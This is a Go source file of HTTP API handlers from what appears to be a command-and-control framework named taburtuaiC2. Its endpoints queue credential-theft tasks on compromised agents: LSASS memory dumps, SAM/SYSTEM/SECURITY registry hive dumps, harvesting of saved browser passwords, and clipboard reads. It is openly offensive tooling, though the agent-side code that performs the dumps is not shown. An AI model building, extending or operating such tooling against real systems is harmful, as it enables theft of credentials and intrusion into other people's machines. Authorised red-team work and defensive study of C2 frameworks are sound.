package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// LSASSDump queues a full-memory LSASS minidump on the agent.
// POST /api/v1/agent/:id/creds/lsass
// Body: { "output": "C:\\Windows\\Temp\\lsass.dmp" }
func (h *Handlers) LSASSDump(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		Output string `json:"output"` // path on target; blank = %TEMP%\lsass.dmp
	}
	c.ShouldBindJSON(&req)

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "lsass_dump",
		DestinationPath: req.Output,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         60,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "LSASS_DUMP", req.Output, true)

	h.APIResponse(c, true, "LSASS dump queued", map[string]interface{}{
		"command_id": cmd.ID,
		"output":     req.Output,
	}, "")
}

// SAMDump queues registry hive dumps (SAM/SYSTEM/SECURITY) on the agent.
// POST /api/v1/agent/:id/creds/sam
// Body: { "output_dir": "C:\\Windows\\Temp" }
func (h *Handlers) SAMDump(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	var req struct {
		OutputDir string `json:"output_dir"`
	}
	c.ShouldBindJSON(&req)

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "sam_dump",
		DestinationPath: req.OutputDir,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         60,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "SAM_DUMP", req.OutputDir, true)

	h.APIResponse(c, true, "SAM dump queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// BrowserCreds queues browser credential harvesting on the agent.
// POST /api/v1/agent/:id/creds/browser
// Body: {} (harvests all supported browsers)
func (h *Handlers) BrowserCreds(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "browsercreds",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "BROWSER_CREDS", "all browsers", true)

	h.APIResponse(c, true, "Browser credential harvest queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// ClipboardRead queues clipboard content retrieval on the agent.
// POST /api/v1/agent/:id/creds/clipboard
func (h *Handlers) ClipboardRead(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "clipboard_read",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       10,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "CLIPBOARD_READ", "", true)

	h.APIResponse(c, true, "Clipboard read queued", map[string]interface{}{
		"command_id": cmd.ID,
	}, "")
}

// helper — unused here, included to keep package consistent with inject_handlers.go
var _ = fmt.Sprintf
